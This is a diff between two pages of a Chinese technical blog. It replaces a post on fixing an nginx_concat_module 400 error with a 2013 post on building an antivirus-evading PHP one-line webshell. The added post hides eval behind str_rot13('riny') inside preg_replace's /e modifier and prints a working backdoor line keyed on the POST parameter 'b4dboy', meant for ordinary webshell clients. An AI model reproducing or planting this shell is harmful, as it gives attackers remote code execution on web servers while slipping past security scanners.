@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 <html lang="en" data-figures="" class="page" data-mode="dim">
   <head>
-<title>nginx1.6下安装nginx_concat_module报400错误 | Funbox的技术记事本</title>
+<title>避开eval关键字，打造免杀一句话木马 | Funbox的技术记事本</title>
 <meta charset="utf-8">
 <meta name="generator" content="Hugo 0.80.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -15,13 +15,13 @@
 <meta property="og:locale" content="en" />
 
 <meta property="og:type" content="article">
-<meta name="description" content="第一次安装都很顺利，第二次安装就出现访问合并链接出现400错误。瞬间就跪了，果断google之，居然有前人也碰到这样的问题，有救了。由于Nginx在新版本中，使用了标准的 MIME-Type：application/javascript。而在nginx_concat_module模块目前版本的代码中， …">
+<meta name="description" content="首先我想到的是将eval从字符串类型赋给一个变量。如：$func = ‘phpinfo’;$func();这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。还 …">
 <meta name="twitter:card" content="summary" />
 <meta name="twitter:creator" content="">
-<meta name="twitter:title" content="nginx1.6下安装nginx_concat_module报400错误" />
-<meta property="og:url" content="https://ifunbox.top/nginx_concat_module_400/" />
-<meta property="og:title" content="nginx1.6下安装nginx_concat_module报400错误" />
-<meta property="og:description" content="第一次安装都很顺利，第二次安装就出现访问合并链接出现400错误。瞬间就跪了，果断google之，居然有前人也碰到这样的问题，有救了。由于Nginx在新版本中，使用了标准的 MIME-Type：application/javascript。而在nginx_concat_module模块目前版本的代码中， …" />
+<meta name="twitter:title" content="避开eval关键字，打造免杀一句话木马" />
+<meta property="og:url" content="https://ifunbox.top/php_anti-antivirus%20/" />
+<meta property="og:title" content="避开eval关键字，打造免杀一句话木马" />
+<meta property="og:description" content="首先我想到的是将eval从字符串类型赋给一个变量。如：$func = ‘phpinfo’;$func();这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。还 …" />
 <meta property="og:image" content="https://ifunbox.top/" />
 <link rel="apple-touch-icon" sizes="180x180" href='https://ifunbox.top/icons/apple-touch-icon.png'>
 <link rel="icon" type="image/png" sizes="32x32" href='https://ifunbox.top/icons/favicon-32x32.png'>
@@ -30,7 +30,7 @@
 <meta name="msapplication-TileColor" content="#002538">
 <meta name="theme-color" content="#002538">
 
-<link rel="canonical" href="https://ifunbox.top/nginx_concat_module_400/">
+<link rel="canonical" href="https://ifunbox.top/php_anti-antivirus%20/">
 
     
 
@@ -126,23 +126,23 @@
   
 <div class="grid-inverse wrap content">
   <article class="post_content">
-    <h1 class="post_title">nginx1.6下安装nginx_concat_module报400错误</h1><div class="post_meta">
+    <h1 class="post_title">避开eval关键字，打造免杀一句话木马</h1><div class="post_meta">
   <svg class="icon">
   <use xlink:href="#calendar"></use>
 </svg>
   <span class="post_date">
-    Dec 1, 2014</span>
+    Oct 8, 2013</span>
 </div>
 
     
 <div class="post_share">
   Share on:
-  <a href="https://twitter.com/intent/tweet?text=nginx1.6%e4%b8%8b%e5%ae%89%e8%a3%85nginx_concat_module%e6%8a%a5400%e9%94%99%e8%af%af&url=https%3a%2f%2fifunbox.top%2fnginx_concat_module_400%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
+  <a href="https://twitter.com/intent/tweet?text=%e9%81%bf%e5%bc%80eval%e5%85%b3%e9%94%ae%e5%ad%97%ef%bc%8c%e6%89%93%e9%80%a0%e5%85%8d%e6%9d%80%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac&url=https%3a%2f%2fifunbox.top%2fphp_anti-antivirus%2520%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
     <svg class="icon">
   <use xlink:href="#twitter"></use>
 </svg>
   </a>
-  <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fifunbox.top%2fnginx_concat_module_400%2f&t=nginx1.6%e4%b8%8b%e5%ae%89%e8%a3%85nginx_concat_module%e6%8a%a5400%e9%94%99%e8%af%af" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
+  <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fifunbox.top%2fphp_anti-antivirus%2520%2f&t=%e9%81%bf%e5%bc%80eval%e5%85%b3%e9%94%ae%e5%ad%97%ef%bc%8c%e6%89%93%e9%80%a0%e5%85%8d%e6%9d%80%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
     <svg class="icon">
   <use xlink:href="#facebook"></use>
 </svg>
@@ -152,7 +152,7 @@
   <use xlink:href="#linkedin"></use>
 </svg>
   </a>
-  <a href="https://ifunbox.top/nginx_concat_module_400/" title="Copy Link" class="link link_yank">
+  <a href="https://ifunbox.top/php_anti-antivirus%20/" title="Copy Link" class="link link_yank">
     <svg class="icon">
   <use xlink:href="#copy"></use>
 </svg>
@@ -160,17 +160,23 @@
 </div>
 
     
-    <p><!-- raw HTML omitted -->第一次安装都很顺利，第二次安装就出现访问合并链接出现400错误。<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted -->瞬间就跪了，果断google之，居然有前人也碰到这样的问题，有救了。<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted -->由于Nginx在新版本中，使用了标准的 MIME-Type：application/javascript。而在nginx_concat_module模块目前版本的代码中，写的是 application/x-javascript 的类型。<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted -->也就是模块认不到js文件了。。。<!-- raw HTML omitted --></p>
-<pre><code>[root@tools-ops01-jz src]# grep javascript nginx_concat_module/ngx_http_concat_module.c
-    ngx_string(&quot;application/x-javascript&quot;),
-</code></pre><p><!-- raw HTML omitted -->因此，我们最好在向nginx添加该模块之前，修改nginx_concat_module的源代码文件ngx_http_concat_module.c，将application/x-javascript更改为application/javascript，然后再编译安装即可！<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted --> <!-- raw HTML omitted --></p>
+    <p><!-- raw HTML omitted -->首先我想到的是将eval从字符串类型赋给一个变量。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->如：$func = ‘phpinfo’;<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->$func();<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->这样的确是可以运行phpinfo()的，但是eval却不能通过这样来执行，我马上又想到了assert函数，他有着类似eval的功能，但效果并不理想，完全没有eval用着爽，而且也是公开了的，所以我也就将他放弃了。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->还记得《20 Ways to Fuzzing PHP Source Code》里提到的preg_replace代码执行漏洞吗？<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->没错，利用preg_replace的模式修饰符e（PREG_REPLACE_EVAL）就可以将替换后的字符串作为php代码评估运行(eval函数方式)。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->既然是将字符串作为php代码评估运行，哪么完全可以替换或者转码一下eval，这样就可以避开关键字了。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->我的一句话木马如下：<!-- raw HTML omitted --></p>
+<ol>
+<li><!-- raw HTML omitted -->($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ’add’);<!-- raw HTML omitted --></li>
+</ol>
+<p><!-- raw HTML omitted -->使用上跟原来的一句话没有区别，可用常用的客户端连接密码b4dboy。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果。<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted -->转载请注明版权，谢谢！http://hi.baidu.com/b4dboy<!-- raw HTML omitted --></p>
 
     
-      <div id="SOHUCS" sid="/nginx_concat_module_400" ></div>
+      <div id="SOHUCS" sid="/php_anti-antivirus " ></div>
 <script type="text/javascript">
     (function(){
         var appid = 'cyvbquHcp';
